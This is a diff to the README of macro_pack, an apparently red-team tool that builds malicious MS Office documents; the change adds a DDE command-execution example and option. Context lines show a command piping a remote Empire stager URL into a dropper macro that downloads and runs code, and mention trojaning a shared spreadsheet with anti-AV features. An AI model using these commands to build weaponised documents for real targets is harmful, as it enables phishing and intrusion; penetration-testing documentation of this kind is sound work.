@@ -116,6 +116,11 @@ echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -
 # 4 When executed on target, the macro will download PowerShdll, run it with rundll32, and download and execute stager.
 ```
 
+- Execute calc.exe via Dynamic Data Exchange (DDE) attack
+```bash
+echo calc.exe | macro_pack.exe --dde -W dde_test.docx
+```
+
 ### macro\_pack pro
 
 - Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
@@ -188,7 +193,8 @@ MS Office document generation requires to be running on Windows machine with gen
     -W, --word-output=WORD_FILE_PATH     Generates MS Word (.docm) file containing the macro.
     -w, --word97-output=WORD_FILE_PATH   Generates MS Word 97-2003 (.doc) file containing the macro.
     -P --ppt-output=PPT_FILE_PATH        Generates MS PowerPoint (.pptm) file.
-
+    --dde   Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
+     DDE attack mode is not compatible with VBA Macro related options.
 ```
 
 
@@ -222,6 +228,7 @@ Blog post about VBA security:
  - https://github.com/EmpireProject/Empire
  - https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
  - https://www.metasploit.com/
+ - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  
 
 
